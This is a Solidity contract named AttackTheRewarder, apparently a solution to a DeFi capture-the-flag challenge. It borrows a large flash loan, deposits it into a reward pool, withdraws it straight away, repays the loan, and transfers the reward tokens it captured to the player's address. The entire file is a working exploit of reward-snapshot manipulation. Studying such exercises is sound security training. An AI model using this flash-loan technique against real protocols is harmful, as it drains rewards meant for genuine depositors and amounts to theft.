// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract AttackTheRewarder {

    FlashLoanerPool flashLoanPool;
    TheRewarderPool rewarderPool;
    ERC20 liquidityToken;
    ERC20 rewardToken;
    address player;
    uint256 constant FLASH_LOAN_AMOUNT = 1000000 ether;

    constructor (
        FlashLoanerPool _flashLoanPool, 
        TheRewarderPool _rewarderPool, 
        ERC20 _liquidityToken,
        ERC20 _rewardToken,
        address _player
    ) {
        flashLoanPool = _flashLoanPool;
        rewarderPool = _rewarderPool;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
        player = _player;
    }

    function attack() external {
        flashLoanPool.flashLoan(FLASH_LOAN_AMOUNT);                
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(
            address(rewarderPool),
            amount
        );
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanPool), amount);
        rewardToken.transfer(player, rewardToken.balanceOf(address(this)));
    }
} 